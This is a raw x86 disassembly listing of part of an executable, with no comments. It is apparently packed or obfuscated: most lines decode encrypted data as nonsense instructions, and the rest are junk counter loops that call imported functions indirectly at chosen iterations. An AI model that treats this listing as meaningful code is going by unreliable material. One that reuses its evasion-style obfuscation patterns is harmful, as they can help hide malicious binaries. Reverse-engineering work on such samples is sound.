  4018e2:	adc    al,BYTE PTR [edi-0xc6912ba]
  4018e8:	call   0x868c:0xb42030a
  4018ef:	aad    0x6e
  4018f1:	cld    
  4018f2:	xor    eax,0xa55b497b
  4018f7:	int    0x56
  4018f9:	inc    esp
  4018fa:	in     al,0xb
  4018fc:	dec    ecx
  4018fd:	ficomp DWORD PTR [edi]
  4018ff:	repz push ecx
  401901:	arpl   WORD PTR [esi-0x2c],sp
  401904:	mov    cl,0x7a
  401906:	(bad)  
  401907:	gs nop
  401909:	das    
  40190a:	mov    dh,0xae
  40190c:	pop    esi
  40190d:	loopne 0x40196e
  40190f:	dec    ecx
  401910:	aas    
  401911:	enter  0xfaa0,0xe3
  401915:	xor    DWORD PTR [esi-0x13edd0b4],edx
  40191b:	inc    esi
  40191c:	out    dx,al
  40191d:	mov    ?,WORD PTR [edx-0x77]
  401920:	enter  0xaa46,0xa5
  401924:	add    ebp,DWORD PTR [edi+ebx*1]
  401927:	rcr    DWORD PTR [ecx],1
  401929:	loop   0x40193c
  40192b:	inc    ecx
  40192c:	je     0x40190b
  40192e:	mov    dl,0x6d
  401930:	dec    edi
  401931:	mov    eax,DWORD PTR [ebp-0x14]
  401934:	jmp    0x40160d
  401939:	mov    eax,DWORD PTR [ebp-0xc]
  40193c:	mov    edx,DWORD PTR [ebp-0x18]
  40193f:	xor    eax,edx
  401941:	cmp    eax,0xe77c698d
  401946:	je     0x4015a9
  40194c:	mov    eax,DWORD PTR [ebp-0x10]
  40194f:	add    DWORD PTR [eax],0x7403501
  401955:	jmp    0x4015a9
  40195a:	mov    eax,DWORD PTR [ebp-0x1c]
  40195d:	cmp    DWORD PTR [eax],edi
  40195f:	je     0x4015a9
  401965:	mov    eax,0x800f1c9c
  40196a:	jmp    0x401622
  40196f:	push   ebp
  401970:	mov    ebp,esp
  401972:	sub    esp,0x44
  401975:	and    DWORD PTR ds:0x4292a1,0x0
  40197f:	mov    edx,DWORD PTR ds:0x4292a1
  401985:	inc    edx
  401986:	mov    DWORD PTR ds:0x4292a1,edx
  40198c:	cmp    DWORD PTR ds:0x4292a1,0x4
  401993:	jne    0x4019a4
  401999:	push   0x6284
  40199e:	call   DWORD PTR ds:0x4278e7
  4019a4:	cmp    DWORD PTR ds:0x4292a1,0x3
  4019ab:	jne    0x4019be
  4019b1:	mov    edx,DWORD PTR ds:0x4292a1
  4019b7:	inc    edx
  4019b8:	mov    DWORD PTR ds:0x4292a1,edx
  4019be:	cmp    DWORD PTR ds:0x4292a1,0x18
  4019c5:	jb     0x40197f
  4019cb:	push   edi
  4019cc:	jmp    0x401aec
  4019d1:	sbb    al,0xdb
  4019d3:	fcmovu st,st(6)
  4019d5:	std    
  4019d6:	sar    DWORD PTR [eax],1
  4019d8:	fstp   QWORD PTR [edi]
  4019da:	or     BYTE PTR [edx-0x3d249803],0xbb
  4019e1:	cld    
  4019e2:	jae    0x401a60
  4019e4:	jl     0x401a57
  4019e6:	jg     0x401a64
  4019e8:	jl     0x401a58
  4019ea:	sub    al,0xd1
  4019ed:	jb     0x401a0a
  4019ef:	pop    sp
  4019f1:	push   edx
  4019f2:	addr16 retf 
  4019f4:	push   ebp
  4019f5:	imul   ebx,edi,0xffffff96
  4019f8:	or     bh,BYTE PTR [esi+0x4a8541ac]
  4019fe:	loope  0x4019dd
  401a00:	imul   eax,DWORD PTR [edx-0x2a],0xffffffd3
  401a04:	ds sub edx,0xffffff94
  401a08:	stc    
  401a09:	push   esi
  401a0a:	rol    DWORD PTR [ebx],cl
  401a0c:	das    
  401a0d:	mov    al,ds:0xac6d0a84
  401a12:	adc    edx,eax
  401a14:	popf   
  401a15:	loope  0x401a91
  401a17:	pop    ss
  401a18:	mov    ?,WORD PTR [esi+esi*1-0x2b]
  401a1c:	out    dx,eax
  401a1d:	adc    al,0x7b
  401a1f:	cmp    cl,BYTE PTR [ebx]
  401a21:	fdivr  DWORD PTR [eax]
  401a23:	rcl    DWORD PTR [eax],cl
  401a25:	jp     0x4019b3
  401a27:	or     ebx,DWORD PTR [edx-0x7b]
  401a2a:	xchg   ebx,eax
  401a2b:	jbe    0x4019ed
  401a2d:	jne    0x4019b4
  401a2f:	inc    ebp
  401a30:	lods   al,BYTE PTR ds:[esi]
  401a31:	inc    ecx
  401a32:	into   
  401a33:	xor    al,0x2b
  401a35:	push   ss
  401a36:	sbb    edi,ebx
  401a38:	sbb    al,BYTE PTR [edi-0x3fcb3a6b]
  401a3e:	fwait
  401a3f:	shr    ebp,0xaa
  401a42:	or     bh,dl
  401a44:	adc    edx,eax
  401a46:	mov    ch,BYTE PTR ds:0x5cc256db
  401a4c:	mov    cl,0x1d
  401a4e:	mov    ds:0x7b3b17a4,al
  401a53:	repnz push edi
  401a55:	cld    
  401a56:	test   BYTE PTR [eax],ch
  401a58:	mov    eax,0xb9f37f00
  401a5d:	cli    
  401a5e:	retf   0xefeb
  401a61:	test   ebp,0x2fc054c9
  401a67:	repnz fiadd WORD PTR [edi-0x3de46dc]
  401a6e:	sbb    ah,dh
  401a70:	fmul   QWORD PTR [ecx]
  401a72:	cwde   
  401a73:	jbe    0x401a71
  401a75:	jp     0x401ab1
  401a77:	cmp    edx,DWORD PTR [ebx+0x51]
  401a7a:	dec    eax
  401a7b:	mov    ecx,0x62fbc2e
  401a80:	adc    al,ah
  401a82:	(bad)  
  401a83:	shr    DWORD PTR [ebx+esi*8+0x2a502a60],cl
  401a8a:	jle    0x401a89
  401a8c:	lods   ax,WORD PTR ds:[esi]
  401a8e:	pop    esi
  401a8f:	mov    dh,0x97
  401a91:	mov    bh,0x4
  401a93:	cmp    al,0xf2
  401a95:	sub    DWORD PTR [ecx-0x5f2266ba],0x7bc4ff17
  401a9f:	mov    esi,0x8734d943
  401aa4:	cmp    BYTE PTR ds:0xb469cbef,0xb4
  401aab:	pop    esp
  401aac:	cmp    BYTE PTR [ecx],al
  401aae:	sbb    DWORD PTR [ebx-0x4d],ecx
  401ab1:	cli    
  401ab2:	call   0x6450:0xe379a945
  401ab9:	retf   0x536e
  401abc:	retf   
  401abd:	in     al,dx
  401abe:	js     0x401add
  401ac0:	push   esi
  401ac1:	test   DWORD PTR [edx-0xb],eax
  401ac4:	adc    bh,al
  401ac6:	xchg   ebp,eax
  401ac7:	inc    ecx
  401ac8:	std    
  401ac9:	xchg   ecx,eax
  401aca:	sub    eax,0x846b7281
  401acf:	mov    ch,0x5
  401ad1:	loop   0x401a6a
  401ad3:	and    eax,esp
  401ad5:	inc    ebx
  401ad6:	pop    edx
  401ad7:	jne    0x401b21
  401ad9:	loop   0x401a90
  401adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401adc:	ds or  eax,0x5c8fa8d0
  401ae2:	dec    ebp
  401ae3:	mov    edx,0x26c5cede
  401ae8:	stc    
  401ae9:	and    BYTE PTR es:[edx],ah
  401aec:	mov    eax,DWORD PTR [ebp+0xc]
  401aef:	and    DWORD PTR ds:0x4292cd,0x0
  401af9:	jmp    0x401b0b
  401afe:	mov    ecx,DWORD PTR ds:0x4292cd
  401b04:	inc    ecx
  401b05:	mov    DWORD PTR ds:0x4292cd,ecx
  401b0b:	cmp    DWORD PTR ds:0x4292cd,0x11
  401b12:	jae    0x401b69
  401b18:	cmp    DWORD PTR ds:0x4292cd,0x4
  401b1f:	jne    0x401b40
  401b25:	push   0x3f75
  401b2a:	push   0x4292cd
  401b2f:	push   DWORD PTR [ebp-0xc]
  401b32:	push   DWORD PTR [ebp-0xc]
  401b35:	push   0x5572
  401b3a:	call   DWORD PTR ds:0x4279bb
  401b40:	cmp    DWORD PTR ds:0x4292cd,0x3
  401b47:	jne    0x401b5a
  401b4d:	mov    ecx,DWORD PTR ds:0x4292cd
  401b53:	inc    ecx
  401b54:	mov    DWORD PTR ds:0x4292cd,ecx
  401b5a:	jmp    0x401afe
  401b5f:	mov    DWORD PTR ds:0x4292c9,0x72d4
  401b69:	mov    DWORD PTR [ebp-0x10],eax
  401b6c:	and    DWORD PTR ds:0x42c882,0x0
  401b76:	jmp    0x401b8a
  401b7b:	xor    ecx,ecx
  401b7d:	xor    ecx,DWORD PTR ds:0x42c882
  401b83:	inc    ecx
  401b84:	mov    DWORD PTR ds:0x42c882,ecx
  401b8a:	cmp    DWORD PTR ds:0x42c882,0x1c
  401b91:	jae    0x401bde
  401b97:	cmp    DWORD PTR ds:0x42c882,0x6
  401b9e:	jne    0x401bb9
  401ba4:	push   0x3a01
  401ba9:	push   0x1f68
  401bae:	push   0x4e47
  401bb3:	call   DWORD PTR ds:0x4278eb
  401bb9:	cmp    DWORD PTR ds:0x42c882,0x5
  401bc0:	jne    0x401bd3
  401bc6:	mov    ecx,DWORD PTR ds:0x42c882
  401bcc:	inc    ecx
  401bcd:	mov    DWORD PTR ds:0x42c882,ecx
  401bd3:	jmp    0x401b7b
  401bd8:	or     edx,0x1630
  401bde:	mov    eax,DWORD PTR [ebp+0x8]
  401be1:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  401be8:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  401bef:	mov    ecx,DWORD PTR ds:0x42c886
  401bf5:	xor    DWORD PTR ds:0x4292cd,ecx
  401bfb:	mov    edx,DWORD PTR [ebp+0x8]
  401bfe:	sbb    DWORD PTR ds:0x427d1f,0x4512
  401c08:	mov    DWORD PTR [ebp-0x40],eax
  401c0b:	mov    eax,0x7510857
  401c10:	adc    ecx,0xd62
  401c16:	jmp    0x401d36
  401c1b:	adc    eax,DWORD PTR [ecx-0x2451948]
  401c21:	push   ebp
  401c22:	pop    ebp
  401c23:	aaa    
  401c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c25:	popa   
  401c26:	lods   al,BYTE PTR ds:[esi]
  401c27:	inc    edi
  401c28:	jg     0x401c85
  401c2a:	(bad)  
  401c2b:	icebp  
  401c2c:	jb     0x401caa
  401c2e:	jl     0x401ca1
  401c30:	jg     0x401cae
  401c32:	jl     0x401c4b
  401c34:	dec    ebx
  401c35:	or     al,0x31
  401c37:	frstor [esp+ecx*2-0xf3d966f]
  401c3e:	mov    DWORD PTR [ebp+0x3d222ef2],ebx
  401c44:	mov    BYTE PTR [esi],dh
  401c46:	repz pop es
  401c48:	or     ch,BYTE PTR [ebx]
  401c4a:	cmp    eax,0x8708569f
  401c4f:	push   cs
  401c50:	ja     0x401c63
  401c52:	dec    ebx
  401c53:	out    dx,eax
  401c54:	daa    
  401c55:	fisttp QWORD PTR [esi+0x1e9452bd]
  401c5b:	mov    al,ds:0xecadeafb
  401c60:	ret    
  401c61:	xchg   ecx,eax
  401c62:	push   ss
  401c63:	sbb    BYTE PTR [edx-0x4ebb5ded],bh
  401c69:	add    ch,BYTE PTR [edx]
  401c6b:	mov    DWORD PTR [ecx+0x2d],eax
  401c6e:	xchg   edi,eax
  401c6f:	add    cl,al
  401c71:	call   0x274b9726
  401c76:	xor    esp,DWORD PTR [bx+si+0x13c2]
  401c7b:	sahf   
  401c7c:	dec    edi
  401c7d:	cdq    
  401c7e:	inc    edx
  401c7f:	stc    
  401c80:	mov    ss,WORD PTR [ebx]
  401c82:	mov    ebx,0xb68868fe
  401c87:	mov    al,0x6c
  401c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c8a:	aas    
  401c8b:	pop    ds
  401c8c:	mov    al,0xb2
  401c8e:	call   ebx
  401c90:	in     al,dx
  401c91:	add    DWORD PTR [ecx-0x26e91694],edi
  401c97:	adc    ecx,ebx
  401c99:	ja     0x401cae
  401c9b:	leave  
  401c9c:	aaa    
  401c9d:	ins    BYTE PTR es:[edi],dx
  401c9e:	cli    
  401c9f:	jbe    0x401d06
  401ca1:	arpl   WORD PTR [ebx],cx
  401ca3:	cmp    ebx,DWORD PTR [eax+0x5f94e452]
  401ca9:	xchg   esi,eax
  401caa:	int3   
  401cab:	mov    esi,0xe248777e
  401cb0:	push   es
  401cb1:	cmp    BYTE PTR [edi+0x7d9f27be],bl
  401cb7:	ror    DWORD PTR [edi+0x78b59dc8],cl
  401cbd:	data16 das 
  401cbf:	adc    DWORD PTR [edx-0xb],ebx
  401cc2:	je     0x401c62
  401cc4:	rcl    dh,cl
  401cc6:	jp     0x401cb9
  401cc8:	add    ebx,DWORD PTR [ebx-0x2b]
  401ccb:	add    al,0x92
  401ccd:	jmp    0x904e0971
  401cd2:	push   0xa2349a2c
  401cd7:	scas   eax,DWORD PTR es:[edi]
  401cd8:	ds pop ecx
  401cda:	sahf   
  401cdb:	arpl   WORD PTR [ebx+0x449b6c10],di
  401ce1:	out    dx,eax
  401ce2:	aad    0xc6
  401ce4:	xchg   esi,edi
  401ce6:	(bad)  
  401ce7:	cmc    
  401ce8:	sbb    ch,BYTE PTR [eax-0x4a183101]
  401cee:	mov    ebp,edx
  401cf0:	or     eax,0xf78d9d47
  401cf5:	jbe    0x401ccc
  401cf7:	push   ds
  401cf8:	add    ch,ah
  401cfa:	bswap  edx
  401cfc:	inc    edi
  401cfd:	pusha  
  401cfe:	push   0xc8a3577
  401d03:	enter  0x21a5,0x46
  401d07:	pop    ss
  401d08:	pop    esi
  401d09:	mov    ebx,0xffdd4570
  401d0e:	mov    ds:0xa82e8315,eax
  401d13:	out    dx,eax
  401d14:	pushf  
  401d15:	pusha  
  401d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d17:	pop    edx
  401d18:	enter  0x604f,0x6e
  401d1c:	sub    DWORD PTR [eax],edi
  401d1e:	dec    ebp
  401d1f:	popf   
  401d20:	add    edx,DWORD PTR [ebp-0x52]
  401d23:	stos   DWORD PTR es:[edi],eax
  401d24:	xchg   BYTE PTR [esi+0x19363013],bh
  401d2a:	jno    0x401d00
  401d2c:	xchg   ebp,eax
  401d2d:	(bad)  
  401d2f:	push   0x33cf9a09
  401d34:	xchg   BYTE PTR [edi+0x33],ch
  401d37:	rol    BYTE PTR [ecx+0x4292c115],1
  401d3d:	add    BYTE PTR [esi-0x16ffffc4],dh
  401d43:	sbb    eax,DWORD PTR [ecx]
  401d45:	add    BYTE PTR [eax],al
  401d47:	(bad)  
  401d48:	mov    eax,0x13bd709b
  401d4d:	cdq    
  401d4e:	mov    edx,0x91382f2
  401d53:	add    ch,BYTE PTR [ebx+0x75f2bbcc]
  401d59:	jl     0x401dd7
  401d5b:	jno    0x401ddc
  401d5d:	jl     0x401ddb
  401d5f:	adc    eax,0x1b21219
  401d64:	mov    ch,0xa7
  401d66:	retf   
  401d67:	hlt    
  401d68:	jmp    0x749:0x648e336b
  401d6f:	push   ebp
  401d70:	xor    cl,BYTE PTR [ebx+ebx*1-0x7a6b7247]
  401d77:	mov    ch,0x17
  401d79:	jne    0x401d8e
  401d7b:	shr    DWORD PTR [edi],cl
  401d7d:	rcr    DWORD PTR [ebx],1
  401d7f:	daa    
  401d80:	pusha  
  401d81:	and    al,0x25
  401d83:	push   edi
  401d84:	dec    esi
  401d85:	test   eax,0x811b20bc
  401d8a:	sub    al,0x47
  401d8c:	je     0x401d65
  401d8e:	jno    0x401d64
  401d90:	pop    ecx
  401d91:	adc    al,0xca
  401d93:	xor    al,0xb4
  401d95:	div    BYTE PTR [ebp+0x50c2e6f7]
  401d9b:	pop    esp
  401d9c:	dec    ecx
  401d9d:	cmp    esi,DWORD PTR [eax+0x3295a508]
  401da3:	fsub   QWORD PTR [esi+0x3fea4a7]
  401da9:	inc    esp
  401daa:	fwait
  401dab:	test   BYTE PTR [ebx],ch
  401dad:	retf   0xda5c
  401db0:	lock inc ebp
  401db2:	jb     0x401e2a
  401db4:	jbe    0x401ded
  401db6:	xchg   ebx,eax
  401db7:	jns    0x401d43
  401db9:	and    esi,DWORD PTR cs:[eax+0x19]
  401dbd:	push   0x57
  401dbf:	pushf  
  401dc0:	out    0x89,al
  401dc2:	lods   al,BYTE PTR ds:[esi]
  401dc3:	mov    ebx,0x56ec377d
  401dc8:	pop    edx
  401dc9:	dec    edx
  401dca:	xor    DWORD PTR [ebp+0x33abcc93],0xb93b6c4c
  401dd4:	adc    DWORD PTR [eax+0x54c589f],0xffffffa4
  401ddb:	pop    ds
  401ddc:	mov    cl,0xc0
  401dde:	cmp    al,0x20
  401de0:	out    dx,al
  401de1:	shl    ebp,0xa8
  401de4:	neg    eax
  401de6:	push   0xffffff9b
  401de8:	cli    
  401de9:	daa    
  401dea:	xchg   esp,eax
  401deb:	sahf   
  401dec:	mov    dl,0xb
  401dee:	xlat   BYTE PTR ds:[ebx]
  401def:	out    0x4,eax
  401df1:	mov    WORD PTR [eax],fs
  401df3:	(bad)  
  401df4:	fadd   QWORD PTR [ecx-0x78]
  401df7:	fisttp QWORD PTR [eax+eiz*1+0xb]
  401dfb:	outs   dx,BYTE PTR ds:[esi]
  401dfc:	or     al,0x1a
  401dfe:	push   eax
  401dff:	xor    al,0x50
  401e01:	sub    dl,BYTE PTR ds:0xf64ad21f
  401e07:	out    dx,al
  401e08:	cmovae ecx,DWORD PTR [esi-0x31]
  401e0c:	dec    ecx
  401e0d:	adc    cl,BYTE PTR [eax+edi*8-0x646b6c49]
  401e14:	retf   
  401e15:	les    ebx,FWORD PTR [edi-0x22967194]
  401e1b:	ins    BYTE PTR es:[edi],dx
  401e1c:	xlat   BYTE PTR ds:[ebx]
  401e1d:	ins    BYTE PTR es:[edi],dx
  401e1e:	cwde   
  401e1f:	pop    ecx
  401e20:	xchg   esi,eax
  401e21:	loop   0x401e1e
  401e23:	xchg   esi,eax
  401e24:	xor    BYTE PTR [ebp+ebp*1+0xb],0xcd
  401e29:	push   ds
  401e2a:	shr    al,cl
  401e2c:	(bad)  
  401e2e:	out    0x25,al
  401e30:	push   ss
  401e31:	dec    ebx
  401e32:	add    al,0xb3
  401e34:	add    al,dl
  401e36:	xchg   ecx,eax
  401e37:	mov    bh,0x64
  401e39:	dec    edx
  401e3a:	push   DWORD PTR [esi+0x2d15b397]
  401e40:	and    eax,0xb4c37c91
  401e45:	test   al,0x56
  401e47:	retf   
  401e48:	aam    0x1c
  401e4a:	push   ds
  401e4b:	les    ebx,FWORD PTR [ecx]
  401e4d:	iret   
  401e4e:	fwait
  401e4f:	jecxz  0x401e0e
  401e51:	sub    al,dh
  401e53:	pop    esi
  401e54:	inc    eax
  401e55:	(bad)  
  401e56:	push   ss
  401e57:	and    al,BYTE PTR [ecx]
  401e59:	inc    eax
  401e5a:	xchg   ebp,eax
  401e5b:	jbe    0x401e6c
  401e5d:	mov    edi,0xeaf16a5b
  401e62:	mov    ecx,0x32729e
  401e67:	adc    DWORD PTR ds:0x427d17,ecx
  401e6d:	add    edx,ecx
  401e6f:	and    edi,DWORD PTR ds:0x4292a1
  401e75:	mov    DWORD PTR [ebp-0x8],edx
  401e78:	adc    DWORD PTR ds:0x427d07,0x2336
  401e82:	mov    edx,DWORD PTR [ebp+0x8]
  401e85:	and    DWORD PTR ds:0x427d1b,0x0
  401e8f:	mov    edi,DWORD PTR ds:0x427d1b
  401e95:	inc    edi
  401e96:	mov    DWORD PTR ds:0x427d1b,edi
  401e9c:	cmp    DWORD PTR ds:0x427d1b,0x2b
  401ea3:	jne    0x401eb2
  401ea9:	push   DWORD PTR [ebp-0x1c]
  401eac:	call   DWORD PTR ds:0x427a8b
  401eb2:	cmp    DWORD PTR ds:0x427d1b,0x1e
  401eb9:	jb     0x401e8f
  401ebf:	mov    edi,DWORD PTR ds:0x4292d9
  401ec5:	and    DWORD PTR ds:0x427d13,edi
  401ecb:	xor    edx,eax
  401ecd:	adc    edi,DWORD PTR ds:0x4292c9
  401ed3:	add    edx,ecx
  401ed5:	mov    DWORD PTR ds:0x4275b0,0x10
  401edf:	cmp    DWORD PTR ds:0x4275b0,0x0
  401ee6:	je     0x401f33
  401eec:	cmp    DWORD PTR ds:0x4275b0,0x6
  401ef3:	jne    0x401f07
  401ef9:	push   DWORD PTR [ebp-0x10]
  401efc:	push   0x12c3
  401f01:	call   DWORD PTR ds:0x4279bf
  401f07:	cmp    DWORD PTR ds:0x4275b0,0x7
  401f0e:	jne    0x401f21
  401f14:	mov    edi,DWORD PTR ds:0x4275b0
  401f1a:	dec    edi
  401f1b:	mov    DWORD PTR ds:0x4275b0,edi
  401f21:	mov    edi,DWORD PTR ds:0x4275b0
  401f27:	dec    edi
  401f28:	mov    DWORD PTR ds:0x4275b0,edi
  401f2e:	jmp    0x401edf
  401f33:	mov    DWORD PTR [ebp+0xc],edx
  401f36:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  401f3d:	xor    edi,edi
  401f3f:	add    edi,DWORD PTR ds:0x427d1f
  401f45:	adc    DWORD PTR ds:0x4292c9,edi
  401f4b:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  401f52:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  401f59:	and    DWORD PTR ds:0x42c896,0x0
  401f63:	jmp    0x401f77
  401f68:	xor    edi,edi
  401f6a:	or     edi,DWORD PTR ds:0x42c896
  401f70:	inc    edi
  401f71:	mov    DWORD PTR ds:0x42c896,edi
  401f77:	cmp    DWORD PTR ds:0x42c896,0x1c
  401f7e:	jae    0x401fc4
  401f84:	cmp    DWORD PTR ds:0x42c896,0xe
  401f8b:	jne    0x401fa3
  401f91:	push   0x0
  401f93:	push   0x55c0
  401f98:	push   0x3960
  401f9d:	call   DWORD PTR ds:0x427a8f
  401fa3:	cmp    DWORD PTR ds:0x42c896,0xd
  401faa:	jne    0x401fbd
  401fb0:	mov    edi,DWORD PTR ds:0x42c896
  401fb6:	inc    edi
  401fb7:	mov    DWORD PTR ds:0x42c896,edi
  401fbd:	jmp    0x401f68
  401fc2:	and    edi,edi
  401fc4:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  401fcb:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  401fd2:	and    DWORD PTR ds:0x4292bd,0x0
  401fdc:	mov    edi,DWORD PTR ds:0x4292bd
  401fe2:	inc    edi
  401fe3:	mov    DWORD PTR ds:0x4292bd,edi
  401fe9:	cmp    DWORD PTR ds:0x4292bd,0x15
  401ff0:	jne    0x402006
  401ff6:	push   0x3d92
  401ffb:	push   0x4275c4
  402000:	call   DWORD PTR ds:0x4279c3
  402006:	cmp    DWORD PTR ds:0x4292bd,0x12
  40200d:	jb     0x401fdc
  402013:	and    edi,0x7576
  402019:	jmp    0x402139
  40201e:	loopne 0x402062
  402020:	sbb    edx,ebp
  402022:	mov    ecx,0xbb5ae36d
  402027:	xchg   esp,eax
  402028:	inc    eax
  402029:	pop    es
  40202a:	push   es
  40202b:	jbe    0x40206a
  40202d:	retf   
  40202e:	div    DWORD PTR [esp+edi*2+0x7c]
  402032:	jno    0x4020b3
  402034:	jl     0x4020b2
  402036:	cmp    al,0xad
  402038:	dec    edx
  402039:	pop    edx
  40203a:	aaa    
  40203b:	jno    0x4020a7
  40203d:	mov    dl,0xa7
  40203f:	and    esi,esp
  402041:	ss cwde 
  402043:	cmp    ch,BYTE PTR [eax]
  402045:	test   al,0x21
  402047:	inc    edi
  402048:	test   DWORD PTR [ebx+eiz*4-0x36],esi
  40204c:	push   edi
  40204d:	and    BYTE PTR [edi-0x2],bl
  402050:	sbb    DWORD PTR [edi],edx
  402052:	adc    esp,0x49
  402055:	pop    esi
  402056:	repnz mov ch,ah
  402059:	pop    es
  40205a:	mov    al,0x60
  40205c:	lods   al,BYTE PTR ds:[esi]
  40205d:	jl     0x40200b
  40205f:	mov    cl,BYTE PTR ds:0x6dd70a25
  402065:	dec    edi
  402066:	fisub  DWORD PTR [esi]
  402068:	(bad)
  40206b:	or     BYTE PTR ds:0x3648b654,al
  402071:	lea    esi,[ebp+0x6e]
  402074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402075:	ror    DWORD PTR [ebx],1
  402077:	sbb    BYTE PTR [eax+ebp*1],bh
  40207a:	pop    es
  40207b:	call   0x4b5b:0xe6a5c007
  402082:	mov    ds:0x332cbc25,al
  402087:	les    esi,FWORD PTR [edx+0xcbbadc]
  40208d:	pop    edi
  40208e:	jp     0x402056
  402090:	lock cld 
  402092:	fnstenv [edx-0x16]
  402095:	cmp    DWORD PTR [esi],0xfffffff5
  402098:	add    BYTE PTR [ebp-0x70df249],bh
  40209e:	xor    DWORD PTR [edx],esi
  4020a0:	sub    cl,BYTE PTR [ebx+0x2ba0ffd5]
  4020a6:	dec    esp
  4020a7:	arpl   WORD PTR [edx-0x6bbb1319],di
  4020ad:	call   0x248b0b16
  4020b2:	ss push es
  4020b4:	inc    eax
  4020b5:	lods   al,BYTE PTR ds:[esi]
  4020b6:	adc    eax,0x3a1d4164
  4020bb:	sti    
  4020bc:	pusha  
  4020bd:	cld    
  4020be:	and    ebp,eax
  4020c0:	stos   DWORD PTR es:[edi],eax
  4020c1:	xchg   ebp,eax
  4020c2:	pop    edi
  4020c3:	pop    esi
  4020c4:	push   ebx
  4020c5:	nop
  4020c6:	stos   DWORD PTR es:[edi],eax
  4020c7:	cmp    edi,DWORD PTR [edx-0x3f]
  4020ca:	scas   al,BYTE PTR es:[edi]
  4020cb:	retf   
  4020cc:	sub    BYTE PTR [edi+ebx*8+0x1c],bh
  4020d0:	int    0x78
  4020d2:	gs dec ecx
  4020d4:	xor    al,0x7a
  4020d6:	in     al,0x6c
  4020d8:	add    esi,DWORD PTR [ebx-0x3c]
  4020db:	in     eax,dx
  4020dc:	(bad)  [edx-0x301d9f18]
  4020e2:	mov    eax,esi
  4020e4:	lock gs (bad) 
  4020e7:	or     DWORD PTR [ebx-0x50],esp
  4020ea:	dec    eax
  4020eb:	call   0x162e0997
  4020f0:	outs   dx,BYTE PTR ds:[esi]
  4020f1:	not    edi
  4020f3:	cld    
  4020f4:	pop    edx
  4020f5:	out    dx,eax
  4020f6:	or     eax,0x1f4470e1
  4020fb:	(bad)  
  4020fc:	pusha  
  4020fd:	ds call 0x8d50:0xa6e19eaa
  402105:	(bad)  
  402106:	jmp    0x402109
  402108:	ficomp DWORD PTR [edx]
  40210a:	(bad)  
  40210b:	xlat   BYTE PTR ds:[ebx]
  40210c:	fdiv   DWORD PTR [ecx-0x2c]
  40210f:	jnp    0x402186
  402111:	cmp    BYTE PTR [eax],0xe3
  402114:	fabs   
  402116:	dec    edi
  402117:	idiv   DWORD PTR [edi]
  402119:	iret   
  40211a:	arpl   WORD PTR [eax],si
  40211c:	lock dec edx
  40211e:	arpl   WORD PTR [ecx],di
  402120:	cmc    
  402121:	xor    al,0x3
  402123:	call   0xc69a:0xfd4d9954
  40212a:	xor    dl,bl
  40212c:	mov    ah,0x20
  40212e:	aad    0x81
  402130:	mov    ebx,0x492419e3
  402135:	cwde   
  402136:	(bad)  
  402137:	shl    BYTE PTR [edx+0x3fc845c7],1
  40213d:	test   DWORD PTR [eax+edi*8+0x3ec445c7],ebx
  402144:	test   DWORD PTR [eax+edi*8+0x558bd70b],ebx
  40214b:	or     BYTE PTR [ebx],dh
  40214d:	ror    BYTE PTR [ebx+0x1df7f07d],1
  402153:	mov    ch,0x92
  402155:	inc    edx
  402156:	add    BYTE PTR [ebx],al
  402158:	rol    edi,1
  40215a:	add    eax,0x4292bd
  40215f:	xchg   BYTE PTR [eax+0x0],bh
  402162:	add    BYTE PTR [ebx],bh
  402164:	cli    
  402165:	je     0x402c82
  40216b:	mov    DWORD PTR ds:0x4292c5,0x3488
  402175:	push   ebx
  402176:	jmp    0x402c5d
  40217b:	mov    edx,DWORD PTR [ebp-0x8]
  40217e:	or     DWORD PTR ds:0x42c892,0x427cf7
  402188:	mov    edi,DWORD PTR [ebp-0x10]
  40218b:	mov    DWORD PTR ds:0x4292c1,0x6c77
  402195:	sub    edi,edx
  402197:	and    DWORD PTR ds:0x4292dd,0x0
  4021a1:	mov    edx,DWORD PTR ds:0x4292dd
  4021a7:	inc    edx
  4021a8:	mov    DWORD PTR ds:0x4292dd,edx
  4021ae:	cmp    DWORD PTR ds:0x4292dd,0x8
  4021b5:	jne    0x4021c9
  4021bb:	push   0x61e8
  4021c0:	push   DWORD PTR [ebp-0x14]
  4021c3:	call   DWORD PTR ds:0x4279c7
  4021c9:	cmp    DWORD PTR ds:0x4292dd,0x7
  4021d0:	jne    0x4021e3
  4021d6:	mov    edx,DWORD PTR ds:0x4292dd
  4021dc:	inc    edx
  4021dd:	mov    DWORD PTR ds:0x4292dd,edx
  4021e3:	cmp    DWORD PTR ds:0x4292dd,0x1a
  4021ea:	jb     0x4021a1
  4021f0:	xor    DWORD PTR ds:0x427cf7,0x6435
  4021fa:	mov    edx,DWORD PTR [ebp-0x4]
  4021fd:	xor    edx,eax
  4021ff:	xor    DWORD PTR ds:0x427cff,0x42c896
  402209:	add    edx,ecx
  40220b:	cmp    edi,edx
  40220d:	mov    DWORD PTR ds:0x42c892,0x3c1d
  402217:	jb     0x402c81
  40221d:	mov    edx,DWORD PTR [ebp-0x28]
  402220:	jmp    0x402340
  402225:	fstp   DWORD PTR [edi-0x39]
  402228:	xlat   BYTE PTR ds:[ebx]
  402229:	jns    0x402292
  40222b:	stc    
  40222c:	popa   
  40222d:	mov    ebx,0xd63fc869
  402232:	and    BYTE PTR [ebx],ah
  402234:	test   DWORD PTR [eax+0x717c7c77],ecx
  40223a:	jg     0x4022b8
  40223c:	jl     0x402238
  40223e:	imul   edi,DWORD PTR [eax],0xffffffec
  402241:	ret    0x487b
  402244:	cld    
  402245:	jg     0x40229a
  402247:	mov    al,ds:0xa8efd97c
  40224c:	dec    edi
  40224d:	in     eax,0x8a
  40224f:	mov    ebp,0x753f4fd1
  402254:	ja     0x40226d
  402256:	bound  edx,QWORD PTR [edx-0x5f226778]
  40225c:	fidivr DWORD PTR [edi+0x330f3135]
  402262:	je     0x40222d
  402264:	cmp    al,0xb1
  402266:	shl    DWORD PTR [ebx*1+0x624bccd9],1
